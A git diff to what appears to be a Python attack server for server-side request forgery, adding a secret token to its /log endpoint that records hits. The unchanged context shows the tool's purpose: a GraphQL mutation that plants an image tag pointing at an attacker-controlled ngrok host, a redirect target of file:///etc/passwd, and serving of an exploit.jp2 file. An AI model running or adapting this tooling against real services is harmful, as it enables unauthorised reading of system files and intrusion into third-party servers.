@@ -19,9 +19,11 @@ After starting, use ssrf_probe.py or run probes manually:
   mutation { post(tags:[], text:"<img src=https://YOUR.ngrok.app/redirect/file>") { post { id } } }
 """
 from http.server import HTTPServer, BaseHTTPRequestHandler
-import urllib.parse, json, datetime, os
+import urllib.parse, json, datetime, os, secrets
 
 LOG = []
+LOG_SECRET = os.environ.get("LOG_SECRET", secrets.token_hex(16))
+print(f"[*] /log token: {LOG_SECRET}  (set LOG_SECRET env var to fix)")
 
 TARGETS = {
     "file":    "file:///etc/passwd",
@@ -256,8 +258,15 @@ class Handler(BaseHTTPRequestHandler):
                 self._404("exploit.jp2 not found — run gen_exploit_jp2.py first")
             return
 
-        # ── /log — show all hits ──────────────────────────────────────────────
+        # ── /log — show all hits (token-protected) ───────────────────────────
         if path == "/log":
+            qs = urllib.parse.parse_qs(self.path.split("?", 1)[1] if "?" in self.path else "")
+            token = qs.get("token", [""])[0]
+            if not secrets.compare_digest(token, LOG_SECRET):
+                self.send_response(403)
+                self.end_headers()
+                self.wfile.write(b"Forbidden. Use /log?token=<LOG_SECRET>")
+                return
             self.send_response(200)
             self.send_header("Content-Type", "application/json")
             self.end_headers()
